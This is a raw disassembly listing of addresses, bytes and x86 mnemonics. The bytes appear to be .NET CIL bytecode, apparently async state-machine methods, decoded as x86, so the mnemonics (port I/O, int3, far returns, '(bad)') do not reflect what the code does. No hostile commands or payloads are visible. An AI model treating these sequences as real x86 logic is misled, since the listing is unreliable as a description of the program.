  404d43:	94                   	xchg   %eax,%esp
  404d44:	00 00                	add    %al,(%eax)
  404d46:	0a 7d 63             	or     0x63(%ebp),%bh
  404d49:	00 00                	add    %al,(%eax)
  404d4b:	04 12                	add    $0x12,%al
  404d4d:	00 15 7d 62 00 00    	add    %dl,0x627d
  404d53:	04 12                	add    $0x12,%al
  404d55:	00 7c 63 00          	add    %bh,0x0(%ebx,%eiz,2)
  404d59:	00 04 12             	add    %al,(%edx,%edx,1)
  404d5c:	00 28                	add    %ch,(%eax)
  404d5e:	0e                   	push   %cs
  404d5f:	00 00                	add    %al,(%eax)
  404d61:	2b 12                	sub    (%edx),%edx
  404d63:	00 7c 63 00          	add    %bh,0x0(%ebx,%eiz,2)
  404d67:	00 04 28             	add    %al,(%eax,%ebp,1)
  404d6a:	96                   	xchg   %eax,%esi
  404d6b:	00 00                	add    %al,(%eax)
  404d6d:	0a 2a                	or     (%edx),%ch
  404d6f:	1e                   	push   %ds
  404d70:	02 28                	add    (%eax),%ch
  404d72:	4a                   	dec    %edx
  404d73:	00 00                	add    %al,(%eax)
  404d75:	0a 2a                	or     (%edx),%ch
  404d77:	46                   	inc    %esi
  404d78:	7e 1f                	jle    0x404d99
  404d7a:	00 00                	add    %al,(%eax)
  404d7c:	04 02                	add    $0x2,%al
  404d7e:	7b 50                	jnp    0x404dd0
  404d80:	00 00                	add    %al,(%eax)
  404d82:	04 28                	add    $0x28,%al
  404d84:	c3                   	ret
  404d85:	00 00                	add    %al,(%eax)
  404d87:	0a 2a                	or     (%edx),%ch
  404d89:	00 00                	add    %al,(%eax)
  404d8b:	00 1b                	add    %bl,(%ebx)
  404d8d:	30 03                	xor    %al,(%ebx)
  404d8f:	00 36                	add    %dh,(%esi)
  404d91:	01 00                	add    %eax,(%eax)
  404d93:	00 34 00             	add    %dh,(%eax,%eax,1)
  404d96:	00 11                	add    %dl,(%ecx)
  404d98:	02 7b 51             	add    0x51(%ebx),%bh
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	04 0a                	add    $0xa,%al
  404d9f:	06                   	push   %es
  404da0:	2c 25                	sub    $0x25,%al
  404da2:	02 7e 21             	add    0x21(%esi),%bh
  404da5:	00 00                	add    %al,(%eax)
  404da7:	04 7d                	add    $0x7d,%al
  404da9:	53                   	push   %ebx
  404daa:	00 00                	add    %al,(%eax)
  404dac:	04 02                	add    $0x2,%al
  404dae:	16                   	push   %ss
  404daf:	7d 54                	jge    0x404e05
  404db1:	00 00                	add    %al,(%eax)
  404db3:	04 38                	add    $0x38,%al
  404db5:	cc                   	int3
  404db6:	00 00                	add    %al,(%eax)
  404db8:	00 02                	add    %al,(%edx)
  404dba:	7b 53                	jnp    0x404e0f
  404dbc:	00 00                	add    %al,(%eax)
  404dbe:	04 02                	add    $0x2,%al
  404dc0:	7b 54                	jnp    0x404e16
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	04 9a                	add    $0x9a,%al
  404dc6:	0b 00                	or     (%eax),%eax
  404dc8:	06                   	push   %es
  404dc9:	39 80 00 00 00 73    	cmp    %eax,0x73000000(%eax)
  404dcf:	82 00 00             	addb   $0x0,(%eax)
  404dd2:	06                   	push   %es
  404dd3:	0c 07                	or     $0x7,%al
  404dd5:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404dd8:	00 0a                	add    %cl,(%edx)
  404dda:	2d 05 dd 96 00       	sub    $0x96dd05,%eax
  404ddf:	00 00                	add    %al,(%eax)
  404de1:	1e                   	push   %ds
  404de2:	28 58 00             	sub    %bl,0x0(%eax)
  404de5:	00 06                	add    %al,(%esi)
  404de7:	72 50                	jb     0x404e39
  404de9:	14 00                	adc    $0x0,%al
  404deb:	70 28                	jo     0x404e15
  404ded:	68 00 00 0a 0d       	push   $0xd0a0000
  404df2:	08 07                	or     %al,(%edi)
  404df4:	09 28                	or     %ebp,(%eax)
  404df6:	2b 00                	sub    (%eax),%eax
  404df8:	00 0a                	add    %cl,(%edx)
  404dfa:	7d 50                	jge    0x404e4c
  404dfc:	00 00                	add    %al,(%eax)
  404dfe:	04 08                	add    $0x8,%al
  404e00:	7b 50                	jnp    0x404e52
  404e02:	00 00                	add    %al,(%eax)
  404e04:	04 28                	add    $0x28,%al
  404e06:	24 00                	and    $0x0,%al
  404e08:	00 0a                	add    %cl,(%edx)
  404e0a:	2d 66 08 fe 06       	sub    $0x6fe0866,%eax
  404e0f:	83 00 00             	addl   $0x0,(%eax)
  404e12:	06                   	push   %es
  404e13:	73 ed                	jae    0x404e02
  404e15:	00 00                	add    %al,(%eax)
  404e17:	0a 28                	or     (%eax),%ch
  404e19:	ee                   	out    %al,(%dx)
  404e1a:	00 00                	add    %al,(%eax)
  404e1c:	0a 6f ca             	or     -0x36(%edi),%ch
  404e1f:	00 00                	add    %al,(%eax)
  404e21:	0a 13                	or     (%ebx),%dl
  404e23:	04 12                	add    $0x12,%al
  404e25:	04 28                	add    $0x28,%al
  404e27:	ef                   	out    %eax,(%dx)
  404e28:	00 00                	add    %al,(%eax)
  404e2a:	0a 2d 3e 02 16 25    	or     0x2516023e,%ch
  404e30:	0a 7d 51             	or     0x51(%ebp),%bh
  404e33:	00 00                	add    %al,(%eax)
  404e35:	04 02                	add    $0x2,%al
  404e37:	11 04 7d 55 00 00 04 	adc    %eax,0x4000055(,%edi,2)
  404e3e:	02 7c 52 00          	add    0x0(%edx,%edx,2),%bh
  404e42:	00 04 12             	add    %al,(%edx,%edx,1)
  404e45:	04 02                	add    $0x2,%al
  404e47:	28 0f                	sub    %cl,(%edi)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	2b de                	sub    %esi,%ebx
  404e4d:	7f 02                	jg     0x404e51
  404e4f:	7b 55                	jnp    0x404ea6
  404e51:	00 00                	add    %al,(%eax)
  404e53:	04 13                	add    $0x13,%al
  404e55:	04 02                	add    $0x2,%al
  404e57:	7c 55                	jl     0x404eae
  404e59:	00 00                	add    %al,(%eax)
  404e5b:	04 fe                	add    $0xfe,%al
  404e5d:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404e62:	02 15 25 0a 7d 51    	add    0x517d0a25,%dl
  404e68:	00 00                	add    %al,(%eax)
  404e6a:	04 12                	add    $0x12,%al
  404e6c:	04 28                	add    $0x28,%al
  404e6e:	cb                   	lret
  404e6f:	00 00                	add    %al,(%eax)
  404e71:	0a de                	or     %dh,%bl
  404e73:	03 26                	add    (%esi),%esp
  404e75:	de 00                	fiadds (%eax)
  404e77:	02 02                	add    (%edx),%al
  404e79:	7b 54                	jnp    0x404ecf
  404e7b:	00 00                	add    %al,(%eax)
  404e7d:	04 17                	add    $0x17,%al
  404e7f:	58                   	pop    %eax
  404e80:	7d 54                	jge    0x404ed6
  404e82:	00 00                	add    %al,(%eax)
  404e84:	04 02                	add    $0x2,%al
  404e86:	7b 54                	jnp    0x404edc
  404e88:	00 00                	add    %al,(%eax)
  404e8a:	04 02                	add    $0x2,%al
  404e8c:	7b 53                	jnp    0x404ee1
  404e8e:	00 00                	add    %al,(%eax)
  404e90:	04 8e                	add    $0x8e,%al
  404e92:	69 3f 21 ff ff ff    	imul   $0xffffff21,(%edi),%edi
  404e98:	02 14 7d 53 00 00 04 	add    0x4000053(,%edi,2),%dl
  404e9f:	de 19                	ficomps (%ecx)
  404ea1:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  404ea7:	51                   	push   %ecx
  404ea8:	00 00                	add    %al,(%eax)
  404eaa:	04 02                	add    $0x2,%al
  404eac:	7c 52                	jl     0x404f00
  404eae:	00 00                	add    %al,(%eax)
  404eb0:	04 11                	add    $0x11,%al
  404eb2:	05 28 f8 00 00       	add    $0xf828,%eax
  404eb7:	0a de                	or     %dh,%bl
  404eb9:	13 02                	adc    (%edx),%eax
  404ebb:	1f                   	pop    %ds
  404ebc:	fe                   	(bad)
  404ebd:	7d 51                	jge    0x404f10
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	04 02                	add    $0x2,%al
  404ec3:	7c 52                	jl     0x404f17
  404ec5:	00 00                	add    %al,(%eax)
  404ec7:	04 28                	add    $0x28,%al
  404ec9:	f9                   	stc
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	0a 2a                	or     (%edx),%ch
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	41                   	inc    %ecx
  404ed1:	34 00                	xor    $0x0,%al
  404ed3:	00 00                	add    %al,(%eax)
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 30                	add    %dh,(%eax)
  404ed9:	00 00                	add    %al,(%eax)
  404edb:	00 ac 00 00 00 dc 00 	add    %ch,0xdc0000(%eax,%eax,1)
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	03 00                	add    (%eax),%eax
  404ee6:	00 00                	add    %al,(%eax)
  404ee8:	1a 00                	sbb    (%eax),%al
  404eea:	00 01                	add    %al,(%ecx)
  404eec:	00 00                	add    %al,(%eax)
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	07                   	pop    %es
  404ef1:	00 00                	add    %al,(%eax)
  404ef3:	00 02                	add    %al,(%edx)
  404ef5:	01 00                	add    %eax,(%eax)
  404ef7:	00 09                	add    %cl,(%ecx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	00 19                	add    %bl,(%ecx)
  404efd:	00 00                	add    %al,(%eax)
  404eff:	00 1a                	add    %bl,(%edx)
  404f01:	00 00                	add    %al,(%eax)
  404f03:	01 36                	add    %esi,(%esi)
  404f05:	02 7c 52 00          	add    0x0(%edx,%edx,2),%bh
  404f09:	00 04 03             	add    %al,(%ebx,%eax,1)
  404f0c:	28 fa                	sub    %bh,%dl
  404f0e:	00 00                	add    %al,(%eax)
  404f10:	0a 2a                	or     (%edx),%ch
  404f12:	00 00                	add    %al,(%eax)
  404f14:	1b 30                	sbb    (%eax),%esi
  404f16:	04 00                	add    $0x0,%al
  404f18:	bd 02 00 00 35       	mov    $0x35000002,%ebp
  404f1d:	00 00                	add    %al,(%eax)
  404f1f:	11 02                	adc    %eax,(%edx)
  404f21:	7b 56                	jnp    0x404f79
  404f23:	00 00                	add    %al,(%eax)
  404f25:	04 0a                	add    $0xa,%al
  404f27:	02 7b 58             	add    0x58(%ebx),%bh
  404f2a:	00 00                	add    %al,(%eax)
  404f2c:	04 0b                	add    $0xb,%al
  404f2e:	06                   	push   %es
  404f2f:	2c 15                	sub    $0x15,%al
  404f31:	06                   	push   %es
  404f32:	17                   	pop    %ss
  404f33:	3b 08                	cmp    (%eax),%ecx
  404f35:	02 00                	add    (%eax),%al
  404f37:	00 02                	add    %al,(%edx)
  404f39:	14 7d                	adc    $0x7d,%al
  404f3b:	59                   	pop    %ecx
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	04 02                	add    $0x2,%al
  404f40:	16                   	push   %ss
  404f41:	7d 5a                	jge    0x404f9d
  404f43:	00 00                	add    %al,(%eax)
  404f45:	04 00                	add    $0x0,%al
  404f47:	06                   	push   %es
  404f48:	26 00 06             	add    %al,%es:(%esi)
  404f4b:	39 9c 00 00 00 07 7b 	cmp    %ebx,0x7b070000(%eax,%eax,1)
  404f52:	33 00                	xor    (%eax),%eax
  404f54:	00 04 28             	add    %al,(%eax,%ebp,1)
  404f57:	3c 00                	cmp    $0x0,%al
  404f59:	00 06                	add    %al,(%esi)
  404f5b:	2c 17                	sub    $0x17,%al
  404f5d:	07                   	pop    %es
  404f5e:	7b 33                	jnp    0x404f93
  404f60:	00 00                	add    %al,(%eax)
  404f62:	04 20                	add    $0x20,%al
  404f64:	bd 01 00 00 20       	mov    $0x20000001,%ebp
  404f69:	c8 00 00 00          	enter  $0x0,$0x0
  404f6d:	28 3d 00 00 06 2d    	sub    %bh,0x2d060000
  404f73:	05 dd 65 01 00       	add    $0x165dd,%eax
  404f78:	00 07                	add    %al,(%edi)
  404f7a:	7b 33                	jnp    0x404faf
  404f7c:	00 00                	add    %al,(%eax)
  404f7e:	04 28                	add    $0x28,%al
  404f80:	38 00                	cmp    %al,(%eax)
  404f82:	00 06                	add    %al,(%esi)
  404f84:	2d 05 dd 53 01       	sub    $0x153dd05,%eax
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	02 7e 10             	add    0x10(%esi),%bh
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	04 7d                	add    $0x7d,%al
  404f92:	5b                   	pop    %ebx
  404f93:	00 00                	add    %al,(%eax)
  404f95:	04 02                	add    $0x2,%al
  404f97:	16                   	push   %ss
  404f98:	7d 5c                	jge    0x404ff6
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	04 38                	add    $0x38,%al
  404f9e:	1b 01                	sbb    (%ecx),%eax
  404fa0:	00 00                	add    %al,(%eax)
  404fa2:	02 7b 5b             	add    0x5b(%ebx),%bh
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	04 02                	add    $0x2,%al
  404fa9:	7b 5c                	jnp    0x405007
  404fab:	00 00                	add    %al,(%eax)
  404fad:	04 9a                	add    $0x9a,%al
  404faf:	0c 1b                	or     $0x1b,%al
  404fb1:	8d 57 00             	lea    0x0(%edi),%edx
  404fb4:	00 01                	add    %al,(%ecx)
  404fb6:	25 16 72 9b 16       	and    $0x169b7216,%eax
  404fbb:	00 70 a2             	add    %dh,-0x5e(%eax)
  404fbe:	25 17 07 7b 33       	and    $0x337b0717,%eax
  404fc3:	00 00                	add    %al,(%eax)
  404fc5:	04 a2                	add    $0xa2,%al
  404fc7:	25 18 72 1b 17       	and    $0x171b7218,%eax
  404fcc:	00 70 a2             	add    %dh,-0x5e(%eax)
  404fcf:	25 19 08 a2 25       	and    $0x25a20819,%eax
  404fd4:	1a 72 1f             	sbb    0x1f(%edx),%dh
  404fd7:	17                   	pop    %ss
  404fd8:	00 70 a2             	add    %dh,-0x5e(%eax)
  404fdb:	28 8f 00 00 0a 0d    	sub    %cl,0xd0a0000(%edi)
  404fe1:	09 28                	or     %ebp,(%eax)
  404fe3:	3e 00 00             	add    %al,%ds:(%eax)
  404fe6:	06                   	push   %es
  404fe7:	3a c3                	cmp    %bl,%al
  404fe9:	00 00                	add    %al,(%eax)
  404feb:	00 00                	add    %al,(%eax)
  404fed:	06                   	push   %es
  404fee:	39 93 00 00 00 07    	cmp    %edx,0x7000000(%ebx)
  404ff4:	7b 34                	jnp    0x40502a
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	04 7b                	add    $0x7b,%al
  404ffa:	31 00                	xor    %eax,(%eax)
  404ffc:	00 04 09             	add    %al,(%ecx,%ecx,1)
  404fff:	28 c3                	sub    %al,%bl
  405001:	00 00                	add    %al,(%eax)
  405003:	0a 09                	or     (%ecx),%cl
  405005:	07                   	pop    %es
  405006:	7b 34                	jnp    0x40503c
  405008:	00 00                	add    %al,(%eax)
  40500a:	04 7b                	add    $0x7b,%al
  40500c:	31 00                	xor    %eax,(%eax)
  40500e:	00 04 28             	add    %al,(%eax,%ebp,1)
  405011:	bb 00 00 0a 28       	mov    $0x280a0000,%ebx
  405016:	02 01                	add    (%ecx),%al
  405018:	00 0a                	add    %cl,(%edx)
  40501a:	09 07                	or     %eax,(%edi)
  40501c:	7b 34                	jnp    0x405052
  40501e:	00 00                	add    %al,(%eax)
  405020:	04 7b                	add    $0x7b,%al
  405022:	31 00                	xor    %eax,(%eax)
  405024:	00 04 28             	add    %al,(%eax,%ebp,1)
  405027:	03 01                	add    (%ecx),%eax
  405029:	00 0a                	add    %cl,(%edx)
  40502b:	28 04 01             	sub    %al,(%ecx,%eax,1)
  40502e:	00 0a                	add    %cl,(%edx)
  405030:	09 07                	or     %eax,(%edi)
  405032:	7b 34                	jnp    0x405068
  405034:	00 00                	add    %al,(%eax)
  405036:	04 7b                	add    $0x7b,%al
  405038:	31 00                	xor    %eax,(%eax)
  40503a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40503d:	05 01 00 0a 28       	add    $0x280a0001,%eax
  405042:	06                   	push   %es
  405043:	01 00                	add    %eax,(%eax)
  405045:	0a 07                	or     (%edi),%al
  405047:	7b 33                	jnp    0x40507c
  405049:	00 00                	add    %al,(%eax)
  40504b:	04 09                	add    $0x9,%al
  40504d:	28 3f                	sub    %bh,(%edi)
  40504f:	00 00                	add    %al,(%eax)
  405051:	06                   	push   %es
  405052:	6f                   	outsl  %ds:(%esi),(%dx)
  405053:	ca 00 00             	lret   $0x0
  405056:	0a 13                	or     (%ebx),%dl
  405058:	04 12                	add    $0x12,%al
  40505a:	04 28                	add    $0x28,%al
  40505c:	ef                   	out    %eax,(%dx)
  40505d:	00 00                	add    %al,(%eax)
  40505f:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  405065:	0a 7d 56             	or     0x56(%ebp),%bh
  405068:	00 00                	add    %al,(%eax)
  40506a:	04 02                	add    $0x2,%al
  40506c:	11 04 7d 5d 00 00 04 	adc    %eax,0x400005d(,%edi,2)
  405073:	02 7c 57 00          	add    0x0(%edi,%edx,2),%bh
  405077:	00 04 12             	add    %al,(%edx,%edx,1)
  40507a:	04 02                	add    $0x2,%al
  40507c:	28 10                	sub    %dl,(%eax)
  40507e:	00 00                	add    %al,(%eax)
  405080:	2b dd                	sub    %ebp,%ebx
  405082:	56                   	push   %esi
  405083:	01 00                	add    %eax,(%eax)
  405085:	00 02                	add    %al,(%edx)
  405087:	7b 5d                	jnp    0x4050e6
  405089:	00 00                	add    %al,(%eax)
  40508b:	04 13                	add    $0x13,%al
  40508d:	04 02                	add    $0x2,%al
  40508f:	7c 5d                	jl     0x4050ee
  405091:	00 00                	add    %al,(%eax)
  405093:	04 fe                	add    $0xfe,%al
  405095:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40509a:	02 15 25 0a 7d 56    	add    0x567d0a25,%dl
  4050a0:	00 00                	add    %al,(%eax)
  4050a2:	04 12                	add    $0x12,%al
  4050a4:	04 28                	add    $0x28,%al
  4050a6:	cb                   	lret
  4050a7:	00 00                	add    %al,(%eax)
  4050a9:	0a de                	or     %dh,%bl
  4050ab:	24 26                	and    $0x26,%al
  4050ad:	de 00                	fiadds (%eax)
  4050af:	02 02                	add    (%edx),%al
  4050b1:	7b 5c                	jnp    0x40510f
  4050b3:	00 00                	add    %al,(%eax)
  4050b5:	04 17                	add    $0x17,%al
  4050b7:	58                   	pop    %eax
  4050b8:	7d 5c                	jge    0x405116
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	04 02                	add    $0x2,%al
  4050be:	7b 5c                	jnp    0x40511c
  4050c0:	00 00                	add    %al,(%eax)
  4050c2:	04 02                	add    $0x2,%al
  4050c4:	7b 5b                	jnp    0x405121
  4050c6:	00 00                	add    %al,(%eax)
  4050c8:	04 8e                	add    $0x8e,%al
  4050ca:	69 3f d2 fe ff ff    	imul   $0xfffffed2,(%edi),%edi
  4050d0:	02 14 7d 5b 00 00 04 	add    0x400005b(,%edi,2),%dl
  4050d7:	de 03                	fiadds (%ebx)
  4050d9:	26 de 00             	fiadds %es:(%eax)
  4050dc:	de 15 02 17 7d 5a    	ficoms 0x5a7d1702
  4050e2:	00 00                	add    %al,(%eax)
  4050e4:	04 de                	add    $0xde,%al
  4050e6:	0c 13                	or     $0x13,%al
  4050e8:	05 02 11 05 7d       	add    $0x7d051102,%eax
  4050ed:	59                   	pop    %ecx
  4050ee:	00 00                	add    %al,(%eax)
  4050f0:	04 de                	add    $0xde,%al
  4050f2:	00 7e 0f             	add    %bh,0xf(%esi)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	04 20                	add    $0x20,%al
  4050f9:	c8 00 00 00          	enter  $0x0,$0x0
  4050fd:	20 58 02             	and    %bl,0x2(%eax)
  405100:	00 00                	add    %al,(%eax)
  405102:	6f                   	outsl  %ds:(%esi),(%dx)
  405103:	39 00                	cmp    %eax,(%eax)
  405105:	00 0a                	add    %cl,(%edx)
  405107:	28 fb                	sub    %bh,%bl
  405109:	00 00                	add    %al,(%eax)
  40510b:	0a 6f ca             	or     -0x36(%edi),%ch
  40510e:	00 00                	add    %al,(%eax)
  405110:	0a 13                	or     (%ebx),%dl
  405112:	04 12                	add    $0x12,%al
  405114:	04 28                	add    $0x28,%al
  405116:	ef                   	out    %eax,(%dx)
  405117:	00 00                	add    %al,(%eax)
  405119:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  40511f:	0a 7d 56             	or     0x56(%ebp),%bh
  405122:	00 00                	add    %al,(%eax)
  405124:	04 02                	add    $0x2,%al
  405126:	11 04 7d 5d 00 00 04 	adc    %eax,0x400005d(,%edi,2)
  40512d:	02 7c 57 00          	add    0x0(%edi,%edx,2),%bh
  405131:	00 04 12             	add    %al,(%edx,%edx,1)
  405134:	04 02                	add    $0x2,%al
  405136:	28 10                	sub    %dl,(%eax)
  405138:	00 00                	add    %al,(%eax)
  40513a:	2b dd                	sub    %ebp,%ebx
  40513c:	9c                   	pushf
  40513d:	00 00                	add    %al,(%eax)
  40513f:	00 02                	add    %al,(%edx)
  405141:	7b 5d                	jnp    0x4051a0
  405143:	00 00                	add    %al,(%eax)
  405145:	04 13                	add    $0x13,%al
  405147:	04 02                	add    $0x2,%al
  405149:	7c 5d                	jl     0x4051a8
  40514b:	00 00                	add    %al,(%eax)
  40514d:	04 fe                	add    $0xfe,%al
  40514f:	15 3a 00 00 01       	adc    $0x100003a,%eax
  405154:	02 15 25 0a 7d 56    	add    0x567d0a25,%dl
  40515a:	00 00                	add    %al,(%eax)
  40515c:	04 12                	add    $0x12,%al
  40515e:	04 28                	add    $0x28,%al
  405160:	cb                   	lret
  405161:	00 00                	add    %al,(%eax)
  405163:	0a 07                	or     (%edi),%al
  405165:	7b 34                	jnp    0x40519b
  405167:	00 00                	add    %al,(%eax)
  405169:	04 7b                	add    $0x7b,%al
  40516b:	32 00                	xor    (%eax),%al
  40516d:	00 04 6f             	add    %al,(%edi,%ebp,2)
  405170:	07                   	pop    %es
  405171:	01 00                	add    %eax,(%eax)
  405173:	0a 26                	or     (%esi),%ah
  405175:	02 7b 59             	add    0x59(%ebx),%bh
  405178:	00 00                	add    %al,(%eax)
  40517a:	04 13                	add    $0x13,%al
  40517c:	05 11 05 2c 17       	add    $0x172c0511,%eax
  405181:	11 05 75 1a 00 00    	adc    %eax,0x1a75
  405187:	01 25 2d 03 11 05    	add    %esp,0x511032d
  40518d:	7a 28                	jp     0x4051b7
  40518f:	08 01                	or     %al,(%ecx)
  405191:	00 0a                	add    %cl,(%edx)
  405193:	6f                   	outsl  %ds:(%esi),(%dx)
  405194:	09 01                	or     %eax,(%ecx)
  405196:	00 0a                	add    %cl,(%edx)
  405198:	02 7b 5a             	add    0x5a(%ebx),%bh
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 13                	add    $0x13,%al
  40519f:	06                   	push   %es
  4051a0:	11 06                	adc    %eax,(%esi)
  4051a2:	17                   	pop    %ss
  4051a3:	33 02                	xor    (%edx),%eax
  4051a5:	de 22                	fisubs (%edx)
  4051a7:	02 14 7d 59 00 00 04 	add    0x4000059(,%edi,2),%dl
  4051ae:	de 19                	ficomps (%ecx)
  4051b0:	13 07                	adc    (%edi),%eax
  4051b2:	02 1f                	add    (%edi),%bl
  4051b4:	fe                   	(bad)
  4051b5:	7d 56                	jge    0x40520d
  4051b7:	00 00                	add    %al,(%eax)
  4051b9:	04 02                	add    $0x2,%al
  4051bb:	7c 57                	jl     0x405214
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	04 11                	add    $0x11,%al
  4051c1:	07                   	pop    %es
  4051c2:	28 f8                	sub    %bh,%al
  4051c4:	00 00                	add    %al,(%eax)
  4051c6:	0a de                	or     %dh,%bl
  4051c8:	13 02                	adc    (%edx),%eax
  4051ca:	1f                   	pop    %ds
  4051cb:	fe                   	(bad)
  4051cc:	7d 56                	jge    0x405224
  4051ce:	00 00                	add    %al,(%eax)
  4051d0:	04 02                	add    $0x2,%al
  4051d2:	7c 57                	jl     0x40522b
  4051d4:	00 00                	add    %al,(%eax)
  4051d6:	04 28                	add    $0x28,%al
  4051d8:	f9                   	stc
  4051d9:	00 00                	add    %al,(%eax)
  4051db:	0a 2a                	or     (%edx),%ch
  4051dd:	00 00                	add    %al,(%eax)
  4051df:	00 41 64             	add    %al,0x64(%ecx)
  4051e2:	00 00                	add    %al,(%eax)
  4051e4:	00 00                	add    %al,(%eax)
  4051e6:	00 00                	add    %al,(%eax)
  4051e8:	cd 00                	int    $0x0
  4051ea:	00 00                	add    %al,(%eax)
  4051ec:	bf 00 00 00 8c       	mov    $0x8c000000,%edi
  4051f1:	01 00                	add    %eax,(%eax)
  4051f3:	00 03                	add    %al,(%ebx)
  4051f5:	00 00                	add    %al,(%eax)
  4051f7:	00 13                	add    %dl,(%ebx)
  4051f9:	00 00                	add    %al,(%eax)
  4051fb:	01 00                	add    %eax,(%eax)
  4051fd:	00 00                	add    %al,(%eax)
  4051ff:	00 2a                	add    %ch,(%edx)
  405201:	00 00                	add    %al,(%eax)
  405203:	00 8f 01 00 00 b9    	add    %cl,-0x46ffffff(%edi)
  405209:	01 00                	add    %eax,(%eax)
  40520b:	00 03                	add    %al,(%ebx)
  40520d:	00 00                	add    %al,(%eax)
  40520f:	00 13                	add    %dl,(%ebx)
  405211:	00 00                	add    %al,(%eax)
  405213:	01 00                	add    %eax,(%eax)
  405215:	00 00                	add    %al,(%eax)
  405217:	00 27                	add    %ah,(%edi)
  405219:	00 00                	add    %al,(%eax)
  40521b:	00 a0 01 00 00 c7    	add    %ah,-0x38ffffff(%eax)
  405221:	01 00                	add    %eax,(%eax)
  405223:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405226:	00 00                	add    %al,(%eax)
  405228:	13 00                	adc    (%eax),%eax
  40522a:	00 01                	add    %al,(%ecx)
  40522c:	00 00                	add    %al,(%eax)
  40522e:	00 00                	add    %al,(%eax)
  405230:	0e                   	push   %cs
  405231:	00 00                	add    %al,(%eax)
  405233:	00 82 02 00 00 90    	add    %al,-0x6ffffffe(%edx)
  405239:	02 00                	add    (%eax),%al
  40523b:	00 19                	add    %bl,(%ecx)
  40523d:	00 00                	add    %al,(%eax)
  40523f:	00 1a                	add    %bl,(%edx)
  405241:	00 00                	add    %al,(%eax)
  405243:	01 36                	add    %esi,(%esi)
  405245:	02 7c 57 00          	add    0x0(%edi,%edx,2),%bh
  405249:	00 04 03             	add    %al,(%ebx,%eax,1)
  40524c:	28 fa                	sub    %bh,%dl
  40524e:	00 00                	add    %al,(%eax)
  405250:	0a 2a                	or     (%edx),%ch
  405252:	00 00                	add    %al,(%eax)
  405254:	1b 30                	sbb    (%eax),%esi
  405256:	03 00                	add    (%eax),%eax
  405258:	22 02                	and    (%edx),%al
  40525a:	00 00                	add    %al,(%eax)
  40525c:	36 00 00             	add    %al,%ss:(%eax)
  40525f:	11 02                	adc    %eax,(%edx)
  405261:	7b 5e                	jnp    0x4052c1
  405263:	00 00                	add    %al,(%eax)
  405265:	04 0a                	add    $0xa,%al
  405267:	06                   	push   %es
  405268:	18 42 d6             	sbb    %al,-0x2a(%edx)
  40526b:	01 00                	add    %eax,(%eax)
  40526d:	00 00                	add    %al,(%eax)
  40526f:	06                   	push   %es
  405270:	45                   	inc    %ebp
  405271:	03 00                	add    (%eax),%eax
  405273:	00 00                	add    %al,(%eax)
  405275:	55                   	push   %ebp
  405276:	00 00                	add    %al,(%eax)
  405278:	00 05 01 00 00 77    	add    %al,0x77000001
  40527e:	01 00                	add    %eax,(%eax)
  405280:	00 7e 1c             	add    %bh,0x1c(%esi)
  405283:	00 00                	add    %al,(%eax)
  405285:	04 20                	add    $0x20,%al
  405287:	80 ee 36             	sub    $0x36,%dh
  40528a:	00 20                	add    %ah,(%eax)
  40528c:	00 dd                	add    %bl,%ch
  40528e:	6d                   	insl   (%dx),%es:(%edi)
  40528f:	00 6f 39             	add    %ch,0x39(%edi)
  405292:	00 00                	add    %al,(%eax)
  405294:	0a 7e 1e             	or     0x1e(%esi),%bh
  405297:	00 00                	add    %al,(%eax)
  405299:	04 6f                	add    $0x6f,%al
  40529b:	d4 00                	aam    $0x0
  40529d:	00 0a                	add    %cl,(%edx)
  40529f:	28 0a                	sub    %cl,(%edx)
  4052a1:	01 00                	add    %eax,(%eax)
  4052a3:	0a 6f ca             	or     -0x36(%edi),%ch
  4052a6:	00 00                	add    %al,(%eax)
  4052a8:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4052ab:	02 28                	add    (%eax),%ch
  4052ad:	ef                   	out    %eax,(%dx)
  4052ae:	00 00                	add    %al,(%eax)
  4052b0:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  4052b6:	0a 7d 5e             	or     0x5e(%ebp),%bh
  4052b9:	00 00                	add    %al,(%eax)
  4052bb:	04 02                	add    $0x2,%al
  4052bd:	08 7d 61             	or     %bh,0x61(%ebp)
  4052c0:	00 00                	add    %al,(%eax)
  4052c2:	04 02                	add    $0x2,%al
  4052c4:	7c 5f                	jl     0x405325
  4052c6:	00 00                	add    %al,(%eax)
  4052c8:	04 12                	add    $0x12,%al
  4052ca:	02 02                	add    (%edx),%al
  4052cc:	28 11                	sub    %dl,(%ecx)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	2b dd                	sub    %ebp,%ebx
  4052d2:	ab                   	stos   %eax,%es:(%edi)
  4052d3:	01 00                	add    %eax,(%eax)
  4052d5:	00 02                	add    %al,(%edx)
  4052d7:	7b 61                	jnp    0x40533a
  4052d9:	00 00                	add    %al,(%eax)
  4052db:	04 0c                	add    $0xc,%al
  4052dd:	02 7c 61 00          	add    0x0(%ecx,%eiz,2),%bh
  4052e1:	00 04 fe             	add    %al,(%esi,%edi,8)
  4052e4:	15 3a 00 00 01       	adc    $0x100003a,%eax
  4052e9:	02 15 25 0a 7d 5e    	add    0x5e7d0a25,%dl
